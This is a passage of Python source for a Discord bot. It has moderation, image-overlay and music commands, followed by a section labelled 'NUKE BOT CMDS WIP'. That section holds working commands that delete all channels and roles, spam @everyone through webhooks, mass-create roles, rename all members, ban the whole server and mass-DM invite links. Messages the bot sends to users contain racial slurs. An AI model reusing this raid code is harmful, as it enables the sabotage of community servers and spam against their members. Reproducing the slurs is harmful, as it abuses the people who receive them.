@app_commands.describe(user="user you'd like to warn", reason="The reason for the warn")
async def warning(interaction: discord.Interaction, user: discord.Member, reason: str):
    if interaction.user.id == user.id:
            await interaction.response.send_message("You cannot warn yourself you retarded nigger", ephemeral=True)
            return
    warn_count = increase_and_get_warnings(user.id, interaction.guild.id)
    embed = discord.Embed(
                    title="🚨 Warning Issued",
                    description=f"{user.mention} has been successfully warned ✅",
                    color=discord.Color.green()
                )
    embed.add_field(name="Warning Count", value=f"{warn_count}/5", inline=False)
    embed.add_field(name="Warn reason:", value=f"{reason}", inline=False)
    embed.set_footer(text="Please follow the server rules. (3 WARNS = 1HR MUTE | 5 = 3 DAY SERVERBAN)")
    await interaction.response.send_message(embed=embed)
    if warn_count >= 5:
        DM_message = "You have been temporarily banned (3 Days) for exceeding warn count."
        await user.send(DM_message)


@bot.tree.command(name="punishmentlog", description="All moderation commands used on a user (SIMPLE)", guild=GUILD_ID)
@app_commands.describe(user="user you'd like to view")
async def modlog(interaction: discord.Interaction, user: discord.Member):
    warn_count = get_warning_count(user.id, interaction.guild.id)
    kick_count = get_kick_count(user.id, interaction.guild.id)
    ban_count = 0
    mute_count = 0
    embed = discord.Embed(
                    title=f"🚨 Mod Logs for {user}",
                    description=f"Shows every moderation action on a user.",
                    color=discord.Color.green()
                ) # add kick amount ban amount mute amount
    embed.add_field(name="WARNS:", value=f" {warn_count} amount of warns.", inline=False)
    embed.add_field(name="KICKS:", value=f" {kick_count} amount of kicks.", inline=False)
    embed.add_field(name="BANS:", value=f" {ban_count} amount of bans.", inline=False)
    embed.add_field(name="MUTES:", value=f" {mute_count} amount of mutes.", inline=False)
    await interaction.response.send_message(embed=embed)
    
@bot.tree.command(name="snipermonkey", description="adds the snipermonkey PFP onto ur image", guild=GUILD_ID)
@app_commands.describe(url="Link to the image")
async def snipermonkeyLogo(interaction: discord.Interaction, url: str):
    image_url = url
    response = requests.get(image_url) 
    await interaction.response.send_message("Processing your image...") 

    if response.status_code == 200:
        img = Image.open(BytesIO(response.content)).convert("RGBA") # loads the image using PIL. RGBA Is so supports transparency cus of error i got

        overlay_url = "https://media.discordapp.net/attachments/1313160789611380756/1366814382444646521/fa15d90c3bc79f2b884aef6d916feb8b.png?ex=68125096&is=6810ff16&hm=4da68487060540b0535129ddcad3a05abf1abf79b90aaa24622a754fc62b0b28&=&format=webp&quality=lossless&width=192&height=192"
        snipermonkey_req = requests.get(overlay_url)
        snipermonkey_req.raise_for_status()
        overlay = Image.open(BytesIO(snipermonkey_req.content)).convert("RGBA") # Same thing and process, downloads it check for success then opens

        bg_width, bg_height = img.size
        ov_width, ov_height = overlay.size
        x = (bg_width - ov_width) // 2
        y = (bg_height - ov_height) // 2 # Calculation to get the direct center by checking the bg + ov width and height and halfing it.
        img.paste(overlay, (x, y), overlay) # Pastes my logo in the coordinates i specified

        output = BytesIO()
        img.save(output, format="PNG")
        output.seek(0)

        await interaction.followup.send(file=discord.File(output, "snipermonkey_overlay.png"))
    else:
        await interaction.followup.send("❌ Failed to process image:")

@bot.tree.command(name="play", description="Play a song or add it to the queue", guild=GUILD_ID)
@app_commands.describe(song_query="Name of song")
async def play(interaction: discord.Interaction, song_query: str):
    await interaction.response.defer()

    async def search_ytdlp_async(query, ydl_opts):
        loop = asyncio.get_running_loop() # gets all async tasks
        return await loop.run_in_executor(None, lambda: _extract(query, ydl_opts)) # Runs a function in a background thread so it doesn’t freeze your bot. None means it uses the default thread pool. then a anonymous function that calls _extract
    
    def _extract(query, ydl_opts):  # This is a synchronous function because yt_dlp is blocking — you run it in a thread.
         with yt_dlp.YoutubeDL(ydl_opts) as ydl: # Creates a YoutubeDL object with the given options, using a with block to manage resources (e.g., temp files, logs, etc.).
             return ydl.extract_info(query, download=False) # Returns the metadata, doesnt download it and uses our query input.

    if not interaction.user.voice or not interaction.user.voice.channel: # checks to see if they arent in VC then sends a warning message
        await interaction.followup.send("You are not in VC lil nigga.")
        return

    voice_channel = interaction.user.voice.channel
    voice_client = interaction.guild.voice_client # this is used to access the voice client associated with the server

    if voice_client is None:
        voice_client = await voice_channel.connect()
    elif voice_client.channel != voice_channel:
        await voice_client.move_to(voice_channel) # Checks to see if the bot sin vc if not connect, if they arent in the right vc then move to the interaction voice channel aka our channel we done the command in

    ydl_options = {
        "format": "bestaudio[abr<=96]/bestaudio",
        "noplaylist": True,
        "youtube_include_dash_manifest": False,
        "youtube_include_hls_manifest": False,
    } # settings

    query = "ytsearch1: " + song_query
    results =  await search_ytdlp_async(query, ydl_options)
    tracks = results.get("entries", []) # yt_dlp returns a dictionary that wraps the results in an "entries" key when it's a playlist or a search result.

    if tracks is None: # if none dont work use not
        await interaction.followup.send("No results found.")
        return
    
    first_track = tracks[0] # This grabs the first result from the list of tracks. (there should be only 1 result anyways)
    audio_url = first_track["url"]
    title = first_track.get("title", "untitled")

    ffmpeg_options = {
        "before_options": "-reconnect 1 -reconnect_streamed 1 -reconnect_delay_max 5", # Settings mainly to handle disconnection, so if it does DC reconnect and has delay timer
        "options": "-vn -c:a libopus -b:a 96k", # These are passed during the main audio processing. No video libopus audio codec 96k bitrate.
    }
    
    source = discord.FFmpegOpusAudio(audio_url, **ffmpeg_options, executable="bin\\ffmpeg\\ffmpeg.exe")
    voice_client.play(source)
    webpage_url = first_track.get("webpage_url", "No URL available")
    await interaction.followup.send(f"🎶 Now playing: [{title}]({webpage_url})")



      

#NUKE BOT CMDS WIP

@bot.command()
@commands.has_permissions(manage_channels=True)

async def create_channel(ctx):
    await ctx.message.delete()
    webhook_name = "snipermonkeybot"
    channel_name = "snipermonkey_runs_this"
    guild = ctx.guild
    channels = []

    for channel in guild.channels:
        try:
            await channel.delete()
            print(f'Deleted channel: {channel.name}')
        except Exception as e:
            print(f'Failed to delete channel {channel.name}: {e}')

    # Create a list of tasks for channel creation
    channel_creation_tasks = []

    

    for i in range(10):
        # Create the channels and store the tasks
        channel_task = guild.create_text_channel(f"{channel_name}_{i + 1}")
        channel_creation_tasks.append(channel_task)

    # Await all channel creations
    channels = await asyncio.gather(*channel_creation_tasks)

    # Create a list of tasks for sending messages
    send_message_tasks = []

    for channel in channels:
        # Create the webhook in each channel
        webhook = await channel.create_webhook(name=webhook_name)
        send_message_task = send_messages(channel, webhook)
        send_message_tasks.append(send_message_task)

    # Await all message sending tasks
    await asyncio.gather(*send_message_tasks)

async def send_messages(channel, webhook):
    for _ in range(10):
        await webhook.send("@everyone Snipermonkey was here! https://discord.gg/QGWffzdT JOIN FOR UPDATES!")
        await asyncio.sleep(0.5)




@bot.command()
@commands.has_permissions(manage_roles=True)
async def mass_roles(ctx):
    roleName = "SnipermonkeyWasHere"

    await ctx.message.delete()
    for i in range(100):

        await ctx.guild.create_role(name=roleName)
        print(f"Created {roleName} for you!") # Will create a shit ton of roles XD
        

@bot.command()
@commands.has_permissions(manage_nicknames=True)
async def mass_nicks(ctx):
    nickName = "SnipermonkeyOwnsU"

    for member in ctx.guild.members:
        if member != ctx.author and member != bot.user:
            try:
                await member.edit(nick=nickName)
                print(f"Changed nickname for {member.name} to {nickName}")
            except discord.Forbidden:
                print(f"Failed to change nickname. No perms...")
            except Exception as e:
                print(f"Failed to change nickname {nickName}: {e}") # Will try to change all the members usernames based of if they're not the bot or the command author


@bot.command()
@commands.has_permissions(ban_members=True)
async def ban_all(ctx):
    for member in ctx.guild.members:
        if member != ctx.author and member != bot.user:
            try:
                await ctx.guild.ban(member)
            except discord.Forbidden:
                print(f"Failed to ban user. No perms...") # just bans the entire server

@bot.command()
async def mass_dm(ctx):
    await ctx.message.delete()
    repeat = 1
    DM_message = "Snipermonkey says join this server https://discord.gg/UbcFjGyckT https://media.discordapp.net/attachments/1018817115500847107/1018818163225403402/image0-1.gif?ex=67d5f39a&is=67d4a21a&hm=dbaafc7d7a8e7b4e68bea029fca9fbd391c98f9d2e326f4b75a2df383015be3c&=&width=619&height=474"
    for member in ctx.guild.members:
        if member.bot:
            continue

        if member == ctx.author:
            continue

        for _ in range(repeat):
            try:
                await member.send(DM_message)
                print(f"Successfully DMD {member.name}") 
            except discord.Forbidden:
                await ctx.send(f"Unable to send a DM to {member.mention}. They might have DMs disabled.")
                break  # Break the inner loop if the dm fails so i can go onto next person

@bot.command()
@commands.has_permissions(manage_roles=True)
async def remove_roles(ctx):
    roles = ctx.guild.roles

    for role in roles:
        if role.name != "@everyone": # If the role is not equal to everyone delete the role
            try:
                await role.delete()
            except Exception as e:
                await ctx.send(f"cant") # if it cannot delete the role itll print this out
 



bot.run(TOKEN)
